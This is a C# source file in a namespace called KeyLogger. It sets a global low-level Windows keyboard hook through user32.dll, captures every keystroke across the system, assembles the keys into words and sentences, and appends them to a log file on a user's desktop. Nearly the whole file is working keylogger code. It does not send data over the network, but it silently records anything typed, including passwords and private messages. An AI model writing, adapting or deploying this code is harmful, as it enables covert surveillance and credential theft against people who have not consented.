﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Reflection.Emit;
using System.Text;

namespace KeyLogger
{
    static class Program
    {
        
        private static int WH_KEYBOARD_LL = 13; //type of hook proc; 13 value means monitoring low level keyboard inputs
        private static StringBuilder word = new StringBuilder();
        private static List<string> sentence = new List<string>();

        public static string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static string logFile = Path.Combine($"C:\\Users\\hrakh\\Desktop", "log_new.log");
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, hookProcedure lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        private delegate IntPtr hookProcedure(int ncode, IntPtr wParam, IntPtr lParam);
        static void WriteResult(string line)
        {
            StreamWriter output = new StreamWriter(Program.logFile, true);
            output.Write(line);
            output.Write("\n");
            output.Close();
        }
 
        private static IntPtr Callback(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 vKey;
            

            if (code >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x104))
            {
                bool shiftOn = false;
                var Caps = Console.CapsLock;
                vKey = Marshal.ReadInt32(lParam);
                if ((GetAsyncKeyState(Keys.ShiftKey) & 0x8000) == 0x8000)
                {
                    shiftOn = true;
                }
                var key =((Keys)vKey).ToString();
                if (!shiftOn & !Caps )
                {
                    key = key.ToLower();
                }
                switch ((Keys)vKey)
                {
                    case Keys.Space:
                        sentence.Add(word.ToString());
                        word = new StringBuilder();
                        break;
                    case Keys.Enter:
                    case Keys.OemPeriod:   
                        WriteResult(String.Join(" ", sentence));
                        sentence = new List<string>();
                        break;
                    case Keys.Oemcomma:
                        word.Append(",");
                        sentence.Add(word.ToString());
                        word = new StringBuilder();
                        break;
                    case Keys.Capital:
                        break;
                    default:
                        word.Append(key);
                        break;
                }
                
            }
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
        static void Main(String[] args)
        {
            hookProcedure callback = Callback;
            var module = Process.GetCurrentProcess().MainModule.ModuleName;
            var moduleHandle = GetModuleHandle(module);
            var hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, moduleHandle, 0);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }
    }
}
